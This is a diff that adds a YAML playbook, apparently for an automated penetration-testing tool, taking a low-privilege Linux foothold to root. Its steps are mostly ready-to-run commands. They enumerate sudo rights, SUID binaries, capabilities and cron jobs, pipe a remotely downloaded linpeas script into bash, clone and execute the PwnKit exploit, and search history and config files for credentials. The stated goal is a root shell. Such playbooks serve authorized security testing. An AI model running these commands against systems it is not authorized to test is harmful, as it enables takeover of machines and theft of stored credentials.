@@ -1,0 +1,57 @@
+id: privesc_linux_suid
+title: "Linux privilege escalation via SUID / sudo / capabilities"
+phase: privesc
+mitre: ["T1548.001", "T1548.003", "T1068"]
+trigger:
+  services: []
+  ports:    []
+  os_any:   ["linux", "ubuntu", "debian", "centos", "rhel", "alpine"]
+  technologies: []
+  cves: []
+keywords:
+  - "linux privesc"
+  - "suid"
+  - "setuid"
+  - "sudo -l"
+  - "linpeas"
+  - "gtfobins"
+  - "capabilities"
+  - "polkit"
+  - "pwnkit"
+preconditions:
+  - "Foothold as low-priv user (e.g. www-data)"
+  - "Outbound connectivity for linpeas download (or local copy staged)"
+steps:
+  - tool: bash
+    cmd:  "id; uname -a; cat /etc/os-release; cat /etc/lsb-release 2>/dev/null"
+    why:  "Snapshot identity + kernel + distro before deep enum"
+  - tool: bash
+    cmd:  "sudo -ln 2>/dev/null"
+    why:  "List sudo-allowed commands without password — fastest privesc primitive"
+  - tool: bash
+    cmd:  "find / -perm -4000 -type f 2>/dev/null"
+    why:  "All SUID binaries — cross-reference each with GTFOBins"
+  - tool: bash
+    cmd:  "getcap -r / 2>/dev/null"
+    why:  "Linux capabilities — cap_setuid + binary like python = instant root"
+  - tool: bash
+    cmd:  "cat /etc/crontab; ls -la /etc/cron.*; ls -la /var/spool/cron/* 2>/dev/null"
+    why:  "Writable cron jobs / scripts running as root"
+  - tool: linpeas
+    cmd:  "curl -s https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash"
+    why:  "Comprehensive enum — colour-coded findings, CVE-mapped checks (PwnKit, OverlayFS, DirtyPipe)"
+  - tool: bash
+    cmd:  "uname -r; searchsploit linux kernel $(uname -r | cut -d. -f1-2)"
+    why:  "Kernel exploit candidates (CVE-2021-22555, DirtyPipe CVE-2022-0847, OverlayFS CVE-2023-0386)"
+  - tool: pwnkit
+    cmd:  "git clone https://github.com/ly4k/PwnKit && cd PwnKit && ./PwnKit"
+    why:  "CVE-2021-4034 — almost universal pre-Jan-2022, single-binary"
+expected_outcome: "Root shell — verify with ``id`` returning ``uid=0(root)``"
+fallbacks:
+  - "If sudo NOPASSWD nothing useful → check /etc/sudoers.d/ for include directives"
+  - "If no SUID exploitable + kernel patched → look for ``LD_PRELOAD`` env preserved (sudo env_keep)"
+  - "Check for credentials in /home/*/.bash_history, /var/www/*/config.php, /etc/postgresql/*.conf"
+  - "Polkit (CVE-2021-4034) is the universal fallback for kernels < 5.16 with polkit < 0.120"
+references:
+  - "https://gtfobins.github.io/"
+  - "https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
